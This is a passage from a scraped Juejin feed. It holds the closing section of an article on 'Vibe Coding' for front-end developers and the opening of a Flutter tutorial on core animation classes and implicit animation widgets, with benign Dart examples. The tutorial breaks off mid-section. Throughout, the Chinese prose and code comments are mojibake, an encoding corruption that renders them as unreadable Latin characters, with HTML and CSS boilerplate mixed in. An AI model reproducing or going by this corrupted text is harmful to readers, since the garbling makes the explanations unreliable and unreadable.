<li><strong>å¯¹ç­–</strong>ï¼š<strong>One-Shot Learningï¼ˆå•æ ·æœ¬å­¦ä¹ ï¼‰</strong> ã€‚åœ¨ Prompt ä¸­è´´ä¸€æ®µä½ è®¤ä¸ºå®Œç¾çš„ç°æœ‰ä»£ç ä½œä¸ºâ€œèŒƒæœ¬â€ï¼Œå‘Šè¯‰ AIï¼šâ€œè¯·ä¸¥æ ¼æ¨¡ä»¿è¿™æ®µä»£ç çš„é£æ ¼å’Œç»“æ„æ¥ç”Ÿæˆæ–°ç»„ä»¶ã€‚â€</li>
</ul>
<h3 data-id="heading-12">4.3 å¤æ‚çŠ¶æ€ç®¡ç†çš„è¾¹ç•Œ</h3>
<ul>
<li><strong>ç°è±¡</strong>ï¼šå½“æ¶‰åŠå¤æ‚çš„å…¨å±€çŠ¶æ€ï¼ˆå¦‚ Redux/Zustandï¼‰æˆ–æ ¸å¿ƒä¸šåŠ¡æµæ—¶ï¼ŒAI å®¹æ˜“é€»è¾‘æ··ä¹±ã€‚</li>
<li><strong>å¯¹ç­–</strong>ï¼š<strong>åˆ†å±‚å¼€å‘</strong>ã€‚æ ¸å¿ƒçš„ä¸šåŠ¡é€»è¾‘ï¼ˆStore è®¾è®¡ã€API å±‚ï¼‰å»ºè®®ç”±èµ„æ·±å·¥ç¨‹å¸ˆæŠŠæ§æ¶æ„ï¼ŒUI å±‚å’Œç®€å•çš„é€»è¾‘å¤„ç†äº¤ç»™ AIã€‚</li>
</ul>
<h2 data-id="heading-13">5. æ€»ç»“ï¼šå‰ç«¯å·¥ç¨‹å¸ˆçš„è¿›åŒ–</h2>
<p>Vibe Coding æ¨¡å¼ä¸‹ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å†™ä»£ç å—ï¼Ÿç­”æ¡ˆæ˜¯éœ€è¦çš„ï¼Œä½†<strong>å†™çš„â€œä»£ç â€å˜äº†</strong>ã€‚</p>
<p>æˆ‘ä»¬éœ€è¦ç¼–å†™çš„ä¸å†æ˜¯å…·ä½“çš„ <code>if-else</code>ï¼Œè€Œæ˜¯ï¼š</p>
<ol>
<li><strong>Prompt</strong>ï¼šç²¾å‡†æè¿°éœ€æ±‚çš„è‡ªç„¶è¯­è¨€ã€‚</li>
<li><strong>Rules</strong>ï¼šçº¦æŸ AI è¡Œä¸ºçš„è§„èŒƒæ–‡æ¡£ã€‚</li>
<li><strong>Tests</strong>ï¼šéªŒè¯ AI äº§å‡ºçš„éªŒæ”¶æ ‡å‡†ã€‚</li>
</ol>
<p>åœ¨è¿™ä¸ªæ–°æ—¶ä»£ï¼Œè¯„ä¼°ä¼˜ç§€å‰ç«¯çš„æ ‡å‡†ä¹Ÿéšä¹‹æ”¹å˜ï¼š</p>
<ul>
<li><strong>Prompt Engineering èƒ½åŠ›</strong>ï¼šèƒ½å¦ç”¨æœ€çŸ­çš„è¯­è¨€æè¿°æœ€å¤æ‚çš„äº¤äº’ï¼Ÿ</li>
<li><strong>Code Review èƒ½åŠ›</strong>ï¼šèƒ½å¦åœ¨ AI ç”Ÿæˆçš„åƒè¡Œä»£ç ä¸­ï¼Œä¸€çœ¼æ´å¯Ÿæ€§èƒ½éšæ‚£ï¼Ÿ</li>
<li><strong>æ¶æ„è®¾è®¡èƒ½åŠ›</strong>ï¼šèƒ½å¦æ­å»ºè®© AI å‘æŒ¥å¾—æ›´å¥½çš„åŸºç¡€è®¾æ–½ï¼Ÿ</li>
</ul>
<p><strong>"Coding is not about typing; it's about thinking."</strong></p>
<p>Vibe Coding å¹¶æ²¡æœ‰æ¶ˆç­ç¼–ç¨‹ï¼Œå®ƒåªæ˜¯å¸®æˆ‘ä»¬çœå»äº†â€œæ‰“å­—â€çš„è¿‡ç¨‹ï¼Œè®©æˆ‘ä»¬ç»ˆäºå¯ä»¥å›å½’ç¼–ç¨‹çš„æœ¬è´¨ï¼š<strong>æ€è€ƒè§£å†³é—®é¢˜çš„æ–¹æ³•</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€ŠFlutterå…¨æ ˆå¼€å‘å®æˆ˜æŒ‡å—ï¼šä»é›¶åˆ°é«˜çº§ã€‹- 17 -æ ¸å¿ƒåŠ¨ç”»]]></title>    <link>https://juejin.cn/post/7576175307352424463</link>    <guid>https://juejin.cn/post/7576175307352424463</guid>    <pubDate>2025-11-24T09:01:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576175307352424463" data-draft-id="7575829296452222986" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€ŠFlutterå…¨æ ˆå¼€å‘å®æˆ˜æŒ‡å—ï¼šä»é›¶åˆ°é«˜çº§ã€‹- 17 -æ ¸å¿ƒåŠ¨ç”»"/> <meta itemprop="keywords" content="Flutter,iOS,Android"/> <meta itemprop="datePublished" content="2025-11-24T09:01:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QuantumLeapä¸¶"/> <meta itemprop="url" content="https://juejin.cn/user/1767603104125197"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€ŠFlutterå…¨æ ˆå¼€å‘å®æˆ˜æŒ‡å—ï¼šä»é›¶åˆ°é«˜çº§ã€‹- 17 -æ ¸å¿ƒåŠ¨ç”»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1767603104125197/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QuantumLeapä¸¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T09:01:36.000Z" title="Mon Nov 24 2025 09:01:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73781550b2ac44b49beb7bd1fe08feae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUXVhbnR1bUxlYXDkuLY=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764579696&amp;x-signature=TkQbImGOKvgrEwff3v79%2FBBppMA%3D" alt="Snipaste_2025-11-24_16-55-23.png" loading="lazy"/>
åŠ¨ç”»æ˜¯ç§»åŠ¨åº”ç”¨çš„çµé­‚ï¼Œèƒ½å¤Ÿå¢å¼ºé¡µé¢äº¤äº’æ•ˆæœï¼Œæ¯”å¦‚ï¼šå¾®ä¿¡ä¸‹æ‹‰åˆ·æ–°çš„æ—‹è½¬åŠ¨ç”»ã€æ”¯ä»˜å®é¡µé¢åˆ‡æ¢çš„å¹³æ»‘è¿‡æ¸¡ã€æŠ–éŸ³ç‚¹èµåŠ¨æ•ˆç­‰ç­‰è¿™äº›ç‚«é…·çš„åŠ¨ç”»æ•ˆæœä½¿ä½ çš„Appæ›´åŠ å‡ºå½©ã€‚ä»Šå¤©æˆ‘ä»¬å°±æ¥æ·±å…¥æ¢è®¨Flutterä¸­é‚£äº›è®©äººæƒŠè‰³çš„åŠ¨ç”»æ•ˆæœï¼Œä¸€æ­¥æ­¥æŒæ¡åŠ¨ç”»çš„æ ¸å¿ƒæŠ€å·§ï¼</p>
</blockquote>
<h2 data-id="heading-1">ä¸€ã€åŠ¨ç”»æ ¸å¿ƒç±»ä»‹ç»</h2>
<h3 data-id="heading-2">1.1 åŠ¨ç”»çš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p>åœ¨æ·±å…¥ä»£ç ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆè¦ç†è§£åŠ¨ç”»çš„æœ¬è´¨ã€‚ç®€å•æ¥è¯´ï¼ŒåŠ¨ç”»å°±æ˜¯<strong>åœ¨ä¸€æ®µæ—¶é—´å†…è¿ç»­æ”¹å˜å±æ€§å€¼</strong>çš„è¿‡ç¨‹ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<ul>
<li>ä¸€ä¸ªæŒ‰é’®ä»é€æ˜å˜æˆä¸é€æ˜ï¼ˆæ”¹å˜opacityå€¼ï¼‰</li>
<li>ä¸€ä¸ªå›¾æ ‡ä»å·¦è¾¹ç§»åŠ¨åˆ°å³è¾¹ï¼ˆæ”¹å˜positionå€¼ï¼‰</li>
<li>ä¸€ä¸ªå®¹å™¨ä»å°å˜å¤§ï¼ˆæ”¹å˜sizeå€¼ï¼‰</li>
</ul>
<p>ç”¨ä¼ªä»£ç è¡¨ç¤ºå°±æ˜¯ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// ä¼ªä»£ç </span>
å¼€å§‹å€¼ = <span class="hljs-number">0.0</span>
ç»“æŸå€¼ = <span class="hljs-number">1.0</span>
æŒç»­æ—¶é—´ = <span class="hljs-number">1.0</span> 

<span class="hljs-comment">// åœ¨1ç§’å†…ï¼Œå½“å‰å€¼ä»0.0çº¿æ€§å˜åŒ–åˆ°1.0</span>
å½“å‰å€¼ = å¼€å§‹å€¼ + (ç»“æŸå€¼ - å¼€å§‹å€¼) * (å·²ç”¨æ—¶é—´ / æŒç»­æ—¶é—´)
</code></pre>
<h3 data-id="heading-3">1.2 åŠ¨ç”»æ ¸å¿ƒç±»</h3>
<p>Flutterçš„åŠ¨ç”»ç³»ç»Ÿå»ºç«‹åœ¨ä»¥ä¸‹å››ä¸ªæ ¸å¿ƒç±»åŸºç¡€ä¹‹ä¸Šï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// 1. AnimationController</span>
AnimationController controller;

<span class="hljs-comment">// 2. Animation</span>
Animation&lt;<span class="hljs-built_in">double</span>&gt; animation;

<span class="hljs-comment">// 3. Tween</span>
Tween&lt;<span class="hljs-built_in">double</span>&gt; tween;

<span class="hljs-comment">// 4. Curve</span>
CurvedAnimation curvedAnimation;
</code></pre>
<p>å¦‚æœæŠŠåŠ¨ç”»æ•ˆæœæ¯”ä½œå¼€è½¦ï¼Œåˆ«æƒ³æ­ªäº†ï¼Œå“ˆå“ˆï¼æƒ³è±¡ä¸€ä¸‹ä½ å°†è½¦ä»Aç‚¹å¼€åˆ°Bç‚¹ï¼š</p>
<blockquote>
<ul>
<li><code>AnimationController</code>å°±åƒæ˜¯ä½ çš„è„šè¸©æ²¹é—¨å’Œåˆ¹è½¦ï¼Œæ§åˆ¶è½¦çš„å¯åŠ¨ã€åœæ­¢ã€åŠ é€Ÿã€å‡é€Ÿ</li>
<li><code>Tween</code>å°±åƒæ˜¯å¯¼èˆªï¼Œå‘Šè¯‰ä½ ä»Aç‚¹ï¼ˆå¼€å§‹å€¼ï¼‰åˆ°Bç‚¹ï¼ˆç»“æŸå€¼ï¼‰çš„è·¯çº¿</li>
<li><code>Animation</code>å°±åƒæ˜¯è½¦é€Ÿè¡¨ï¼Œå®æ—¶æ˜¾ç¤ºå½“å‰çš„é€Ÿåº¦å€¼</li>
<li><code>Curve</code>å°±åƒæ˜¯é“è·¯çŠ¶å†µï¼Œå†³å®šäº†ä½ æ˜¯åŒ€é€Ÿå‰è¿›ã€å…ˆå¿«åæ…¢ï¼Œè¿˜æ˜¯æœ‰ä»€ä¹ˆç‰¹æ®Šçš„åŠ é€Ÿæ¨¡å¼</li>
</ul>
</blockquote>
<h3 data-id="heading-4">1.3 æ ¸å¿ƒç±»çš„èŒè´£</h3>
<p><strong>Animation - å€¼å®¹å™¨</strong></p>
<pre><code class="hljs language-dart" lang="dart">Animation&lt;<span class="hljs-built_in">double</span>&gt; sizeAnimation;

<span class="hljs-comment">// ä¸»è¦èŒè´£ï¼š</span>
<span class="hljs-comment">// - æŒæœ‰å½“å‰åŠ¨ç”»å€¼</span>
<span class="hljs-comment">// - é€šçŸ¥ç›‘å¬å™¨å€¼å‘ç”Ÿå˜åŒ–</span>
<span class="hljs-comment">// - ç®¡ç†åŠ¨ç”»çŠ¶æ€</span>

<span class="hljs-comment">// æ·»åŠ å€¼ç›‘å¬å™¨</span>
sizeAnimation.addListener(() {
  setState(() {
    <span class="hljs-comment">// å½“åŠ¨ç”»å€¼å˜åŒ–æ—¶ï¼Œé‡å»ºWidgetã€‚ã€‚ã€‚</span>
  });
});

<span class="hljs-comment">// æ·»åŠ çŠ¶æ€ç›‘å¬å™¨  </span>
sizeAnimation.addStatusListener((status) {
  <span class="hljs-keyword">switch</span> (status) {
    <span class="hljs-keyword">case</span> AnimationStatus.dismissed:
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'åŠ¨ç”»åœ¨å¼€å§‹çŠ¶æ€'</span>); 
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> AnimationStatus.forward:
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ­£å‘æ‰§è¡Œ'</span>); 
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> AnimationStatus.reverse:
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'åå‘æ‰§è¡Œ'</span>); 
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> AnimationStatus.completed:
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ‰§è¡Œå®Œæˆ'</span>); 
      <span class="hljs-keyword">break</span>;
  }
});
</code></pre>
<p><strong>AnimationController</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_MyAnimationState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">MyAnimation</span>&gt; 
    <span class="hljs-title">with</span> <span class="hljs-title">SingleTickerProviderStateMixin</span> </span>{
  
  <span class="hljs-keyword">late</span> AnimationController controller;
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> initState() {
    <span class="hljs-keyword">super</span>.initState();
    
    <span class="hljs-comment">// åˆ›å»ºåŠ¨ç”»æ§åˆ¶å™¨</span>
    controller = AnimationController(
      duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">2</span>),  <span class="hljs-comment">// æŒç»­2ç§’</span>
      vsync: <span class="hljs-keyword">this</span>,                     <span class="hljs-comment">// å‚ç›´åŒæ­¥</span>
    );
  }
  
  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> dispose() {
    controller.dispose();  <span class="hljs-comment">// é‡Šæ”¾</span>
    <span class="hljs-keyword">super</span>.dispose();
  }
}
</code></pre>
<p><strong>è¿™é‡Œæœ‰ä¸ªé‡è¦æ¦‚å¿µï¼švsync</strong>
<code>vsync</code>çš„ä½œç”¨æ˜¯é˜²æ­¢åŠ¨ç”»åœ¨é¡µé¢ä¸å¯è§æ—¶ç»§ç»­è¿è¡Œï¼Œé€ æˆæµªè´¹èµ„æºã€‚é€šè¿‡<code>SingleTickerProviderStateMixin</code>ï¼Œå½“é¡µé¢è¢«é®æŒ¡æˆ–åˆ‡æ¢åˆ°åå°æ—¶ï¼ŒåŠ¨ç”»ä¼šè‡ªåŠ¨æš‚åœã€‚</p>
<h2 data-id="heading-5">äºŒã€éšå¼åŠ¨ç”»</h2>
<h3 data-id="heading-6">2.1 ä»€ä¹ˆæ˜¯éšå¼åŠ¨ç”»ï¼Ÿ</h3>
<p>æœ¬è´¨å°±æ˜¯<strong>å‘Šè¯‰Widgetæœ€ç»ˆçš„çŠ¶æ€æ˜¯ä»€ä¹ˆ</strong>ï¼ŒFlutterä¼šè‡ªåŠ¨å¸®ä½ ç”Ÿæˆè¿‡æ¸¡åŠ¨ç”»ã€‚</p>
<ul>
<li>æ™®é€šWidgetï¼šä¸åŠ ä»»ä½•åŠ¨ç”»æ•ˆæœï¼Œwidgetä¼šå¾ˆç”Ÿç¡¬çš„ç›´æ¥è¿‡æ¸¡è¿‡å»ï¼›</li>
<li>éšå¼åŠ¨ç”»Widgetï¼šä»æ—§çŠ¶æ€åˆ°æ–°çŠ¶æ€é—´æœ‰ä¸€ä¸ªå¹³æ»‘çš„è¿‡æ¸¡ï¼Œç”¨æˆ·ä½“éªŒæ›´å¥½ä¸€äº›ï¼›</li>
</ul>
<h3 data-id="heading-7">2.2 éšå¼åŠ¨ç”»ç»„ä»¶</h3>
<h4 data-id="heading-8">2.2.1 AnimatedContainer</h4>
<p><code>AnimatedContainer</code>ï¼šæœ€å¸¸ç”¨çš„éšå¼åŠ¨ç”»ç»„ä»¶ï¼Œå‡ ä¹æ‰€æœ‰çš„å®¹å™¨å±æ€§åŠ¨ç”»éƒ½å¯ä»¥ç”¨å®ƒæ¥å®Œæˆã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimatedContainerExample</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _AnimatedContainerExampleState createState() =&gt; _AnimatedContainerExampleState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_AnimatedContainerExampleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">AnimatedContainerExample</span>&gt; </span>{
  <span class="hljs-comment">// å®šä¹‰å¯å˜å±æ€§</span>
  <span class="hljs-built_in">double</span> _width = <span class="hljs-number">100.0</span>;
  <span class="hljs-built_in">double</span> _height = <span class="hljs-number">100.0</span>;
  Color _color = Colors.blue;
  BorderRadius _borderRadius = BorderRadius.circular(<span class="hljs-number">8.0</span>);
  
  <span class="hljs-keyword">void</span> _toggleAnimation() {
    setState(() {
      <span class="hljs-comment">// æ”¹å˜å±æ€§å€¼</span>
      _width = _width == <span class="hljs-number">100.0</span> ? <span class="hljs-number">200.0</span> : <span class="hljs-number">100.0</span>;
      _height = _height == <span class="hljs-number">100.0</span> ? <span class="hljs-number">200.0</span> : <span class="hljs-number">100.0</span>;
      _color = _color == Colors.blue ? Colors.green : Colors.blue;
      _borderRadius = _borderRadius == BorderRadius.circular(<span class="hljs-number">8.0</span>) 
          ? BorderRadius.circular(<span class="hljs-number">50.0</span>)   <span class="hljs-comment">// å˜æˆåœ†</span>
          : BorderRadius.circular(<span class="hljs-number">8.0</span>);   <span class="hljs-comment">// å˜å›åœ†è§’çŸ©å½¢</span>
    });
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        AnimatedContainer(
          width: _width,
          height: _height,
          duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),     <span class="hljs-comment">// åŠ¨ç”»æ—¶é•¿</span>
          curve: Curves.easeInOut,            <span class="hljs-comment">// åŠ¨ç”»æ›²çº¿</span>
          decoration: BoxDecoration(
            color: _color,
            borderRadius: _borderRadius,
          ),
          child: Center(
            child: Text(
              <span class="hljs-string">'ç‚¹æˆ‘'</span>,
              style: TextStyle(color: Colors.white),
            ),
          ),
        ),
        SizedBox(height: <span class="hljs-number">20</span>),
        ElevatedButton(
          onPressed: _toggleAnimation,
          child: Text(<span class="hljs-string">'è§¦å‘åŠ¨ç”»'</span>),
        ),
      ],
    );
  }
}
</code></pre>
<p><strong>AnimatedContaineræ”¯æŒçš„åŠ¨ç”»å±æ€§ï¼š</strong></p>
<ul>
<li><strong>å°ºå¯¸</strong>ï¼š<code>width</code>ã€<code>height</code></li>
<li><strong>é¢œè‰²</strong>ï¼š<code>color</code></li>
<li><strong>è¾¹æ¡†åœ†è§’</strong>ï¼š<code>borderRadius</code></li>
<li><strong>å†…è¾¹è·</strong>ï¼š<code>padding</code></li>
<li><strong>å¤–è¾¹è·</strong>ï¼š<code>margin</code></li>
<li><strong>é˜´å½±</strong>ï¼š<code>boxShadow</code></li>
<li><strong>å˜æ¢</strong>ï¼š<code>transform</code></li>
</ul>
<h4 data-id="heading-9">2.2.2 AnimatedOpacity</h4>
<p>ç”¨æ¥å¤„ç†é€æ˜åº¦å˜åŒ–çš„ç»„ä»¶ï¼Œéå¸¸é€‚åˆå®ç°æ˜¾ç¤º/éšè—çš„è¿‡æ¸¡æ•ˆæœã€‚</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnimatedOpacityExample</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  _AnimatedOpacityExampleState createState() =&gt; _AnimatedOpacityExampleState();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_AnimatedOpacityExampleState</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">AnimatedOpacityExample</span>&gt; </span>{
  <span class="hljs-built_in">double</span> _opacity = <span class="hljs-number">1.0</span>;  <span class="hljs-comment">// 1.0 = å®Œå…¨æ˜¾ç¤ºï¼Œ0.0 = å®Œå…¨éšè—</span>
  
  <span class="hljs-keyword">void</span> _toggleVisibility() {
    setState(() {
      _opacity = _opacity == <span class="hljs-number">1.0</span> ? <span class="hljs-number">0.0</span> : <span class="hljs-number">1.0</span>;
    });
  }
  
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> Column(
      children: [
        AnimatedOpacity(
          opacity: _opacity,
          duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),
          curve: Curves.easeInOut,
          child: Container(
            width: <span class="hljs-number">200</span>,
            height: <span class="hljs-number">200</span>,
            color: Colors.blue,
            child: Center(
              child: Text(
                <span class="hljs-string">'æ·¡å…¥æ·¡å‡º'</span>,
                style: TextStyle(color: Colors.white, fontSize: <span class="hljs-number">20</span>),
              ),
            ),
          ),
        ),
        SizedBox(height: <span class="hljs-number">20</span>),
        ElevatedButton(
          onPressed: _toggleVisibility,
          child: Text(_opacity == <span class="hljs-number">1.0</span> ? <span class="hljs-string">'éšè—'</span> : <span class="hljs-string">'æ˜¾ç¤º'</span>),
        ),
      ],
    );
  }
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é¡µé¢å…ƒç´ çš„æ˜¾ç¤º/éšè—</li>
<li>åŠ è½½çŠ¶æ€çš„è¿‡æ¸¡</li>
<li>é”™è¯¯ä¿¡æ¯çš„æ·¡å…¥æ·¡å‡º</li>
</ul>
<h4 data-id="heading-10">2.2.3 å…¶ä»–éšå¼åŠ¨ç”»ç»„ä»¶</h4>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// AnimatedPadding - å†…è¾¹è·åŠ¨ç”»</span>
AnimatedPadding(
  padding: EdgeInsets.all(_paddingValue),
  duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),
  child: YourWidget(),
)

<span class="hljs-comment">// AnimatedAlign - å¯¹é½ä½ç½®åŠ¨ç”»  </span>
AnimatedAlign(
  alignment: _alignment,
  duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),
  child: YourWidget(),
)

<span class="hljs-comment">// AnimatedPositioned - å®šä½åŠ¨ç”»ï¼ˆæ³¨æ„ï¼šåªèƒ½åœ¨Stackä¸­ä½¿ç”¨ï¼‰</span>
AnimatedPositioned(
  left: _left,
  top: _top,
  duration: <span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">1</span>),
  child: YourWidget(),
)
</code></pre>
<h3 data-id="heading-11">2.3 éšå¼åŠ¨ç”»çš„å·¥ä½œåŸç†</h3>
